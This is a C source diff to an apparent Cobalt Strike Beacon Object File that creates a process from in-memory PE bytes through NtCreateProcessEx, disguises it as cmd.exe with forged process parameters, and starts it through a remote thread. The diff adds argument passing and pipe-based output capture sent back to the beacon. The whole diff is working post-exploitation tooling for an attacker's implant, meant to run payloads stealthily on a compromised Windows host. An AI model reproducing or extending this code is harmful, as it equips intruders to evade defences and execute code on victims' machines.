@@ -1,7 +1,8 @@
 #include <stdio.h>
 #include "bofdefs.h"
 
-
+//#define STARTF_USESTDHANDLES 0x100
+#define BUF_SIZE 512
 typedef LONG KPRIORITY;
 typedef int WINBOOL, * PWINBOOL, * LPWINBOOL;
 typedef enum _PROCESSINFOCLASS
@@ -607,7 +608,9 @@ NTSYSAPI NTSTATUS NTAPI NTDLL$RtlCreateProcessParametersEx(
     ULONG Flags // pass RTL_USER_PROC_PARAMS_NORMALIZED to keep parameters normalized
 );
 
-BOOL CopyBytesByHandle(PBYTE peBytes,DWORD size,HANDLE targetHandle) {
+WINBASEAPI WINBOOL WINAPI KERNEL32$CreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
+WINBASEAPI WINBOOL WINAPI KERNEL32$SetHandleInformation(HANDLE hObject, DWORD dwMask, DWORD dwFlags);
+WINBASEAPI WINBOOL WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);BOOL CopyBytesByHandle(PBYTE peBytes,DWORD size,HANDLE targetHandle) {
     DWORD bytesWritten;
     KERNEL32$WriteFile(targetHandle,
         peBytes,
@@ -726,7 +729,8 @@ BOOL WriteRemoteProcessParameters(
     LPWSTR WindowTitle,
     LPWSTR DesktopInfo,
     LPWSTR ShellInfo,
-    LPWSTR RuntimeData)
+    LPWSTR RuntimeData,
+    HANDLE pipeHandle)
 {
     UNICODE_STRING imageName;
     UNICODE_STRING dllPath;
@@ -776,7 +780,12 @@ BOOL WriteRemoteProcessParameters(
         NULL,
         NULL,
         0);
-    
+    if(pipeHandle!=INVALID_HANDLE_VALUE){
+        params->StandardOutput = pipeHandle;
+        params->StandardError = pipeHandle;
+        params->ConsoleHandle = (HANDLE)-3;
+        params->WindowFlags = STARTF_USESTDHANDLES;
+    }
     if(res != NT_SUCCESS){
         BeaconPrintf(CALLBACK_OUTPUT,"[!] Failed RtlCreateProcessParametersEx. params: 0x%p\n",params);
         return FALSE;
@@ -818,16 +827,44 @@ BOOL WriteRemoteProcessParameters(
     return TRUE;
 }
 
+void readFromPipe(HANDLE pipe_handle) {
+    char buffer[BUF_SIZE] = { 0 };
+    DWORD dwRead = 0;
+    while (1) {
+        int bSuccess = KERNEL32$ReadFile(pipe_handle, buffer, BUF_SIZE, &dwRead, NULL);
+        if (!bSuccess) {
+            break;
+        }
+        else if (dwRead == 0)
+            break;
+        else{
+            BeaconPrintf(CALLBACK_OUTPUT, "%s",buffer);
+            memset(buffer,0,BUF_SIZE);
+        }
+    }
+}
 void go(char* buff, int len) {
     datap parser;
     char* peName;
     unsigned char* pebytes;
+    wchar_t* args;
+    int capture_output = 0;
     SIZE_T pebytes_len;
+    SECURITY_ATTRIBUTES saAttr;
+    // Set the bInheritHandle flag so pipe handles are inherited. 
+
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+    HANDLE g_hChildStd_OUT_Rd = NULL;
+    HANDLE g_hChildStd_OUT_Wr = NULL;
 
     BeaconDataParse(&parser, buff, len);
     peName = BeaconDataExtract(&parser, NULL);
     pebytes_len = BeaconDataLength(&parser);
     pebytes = (unsigned char*)BeaconDataExtract(&parser, NULL);
+    capture_output = BeaconDataInt(&parser);
+    args = (wchar_t*)BeaconDataExtract(&parser,NULL);
     // Declare variables / structs
     HANDLE hProc = NULL;
     // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
@@ -841,6 +878,14 @@ void go(char* buff, int len) {
     //ULONG_PTR dwData = NULL;
     SIZE_T bytesWritten;
 
+     if (!KERNEL32$CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)){
+        BeaconPrintf(CALLBACK_OUTPUT, "[-] CreatePipe Failed with error %d\n",GetLastError());
+        return;
+     }
+    if (!KERNEL32$SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)){
+        BeaconPrintf(CALLBACK_OUTPUT, "[-] SetHandleInformation Failed with error %d\n",GetLastError());
+        return;
+    }
     BeaconPrintf(CALLBACK_OUTPUT, "pe bytes len: %d\n", pebytes_len);
     BeaconPrintf(CALLBACK_OUTPUT, "pe bytes addr: 0x%p\n", pebytes);
 
@@ -900,7 +945,7 @@ void go(char* buff, int len) {
     }
 
     if (res != NT_SUCCESS) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[!] NtCreateProcessEx failed. processHandle: 0x%p\n",processHandle);
+        BeaconPrintf(CALLBACK_OUTPUT, "[-] NtCreateProcessEx failed. processHandle: 0x%p\n",processHandle);
         KERNEL32$CloseHandle(targetFileHandle);
         return;
     }
@@ -946,22 +991,31 @@ void go(char* buff, int len) {
         "Writing process parameters, remote PEB ProcessParameters 0x%p...\n",
         (PBYTE)pbi.PebBaseAddress+FIELD_OFFSET(PEB, ProcessParameters));
     
+    wchar_t* commandline = malloc((wcslen(args)+100)*sizeof(wchar_t));
+    memset(commandline,0,(wcslen(args)+100)*sizeof(wchar_t));
+    wchar_t* exe_path = L"C:\\Users\\Windows\\System32\\cmd.exe ";
+    wchar_t* ptr = commandline;
+    memcpy(ptr,exe_path,wcslen(exe_path)*sizeof(wchar_t));
+    ptr += wcslen(exe_path);
+    memcpy(ptr,args,wcslen(args)*sizeof(wchar_t));
 
     if(!WriteRemoteProcessParameters(
         processHandle,
         L"C:\\Users\\Windows\\System32\\cmd.exe",
         L"",
         L"",
-        L"\"C:\\Users\\Windows\\System32\\cmd.exe\"",
+        commandline,
         NtCurrentTeb()->ProcessEnvironmentBlock->ProcessParameters->Environment,
         L"C:\\Users\\Windows\\System32\\cmd.exe",
         L"WinSta0\\Default",
         L"",
-        L"")){
+        L"",
+        g_hChildStd_OUT_Wr)){
             KERNEL32$CloseHandle(processHandle);
             KERNEL32$CloseHandle(targetFileHandle);
+            free(commandline);
             return;
-        }
+    }
 
     void* remoteEntryPoint = (LPBYTE)peb.ImageBaseAddress + imageEntryPointRva;
     BeaconPrintf(CALLBACK_OUTPUT, "Creating thread in process at entry point 0x%p...\n", remoteEntryPoint);
@@ -985,6 +1039,7 @@ void go(char* buff, int len) {
         BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed ntCreateThreadEx. ThreadHandle: 0x%p\n", threadHandle);
         KERNEL32$CloseHandle(processHandle);
         KERNEL32$CloseHandle(targetFileHandle);
+        free(commandline);
         return;
     }
     if(!KERNEL32$CloseHandle(threadHandle)){
@@ -998,6 +1053,11 @@ void go(char* buff, int len) {
     if(!KERNEL32$CloseHandle(targetFileHandle)){
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Not able to close targetFileHandle\n");
     }
+    if(capture_output){
+        KERNEL32$CloseHandle(g_hChildStd_OUT_Wr);
+        readFromPipe(g_hChildStd_OUT_Rd);
+    }
+    free(commandline);
     return;
 
 }
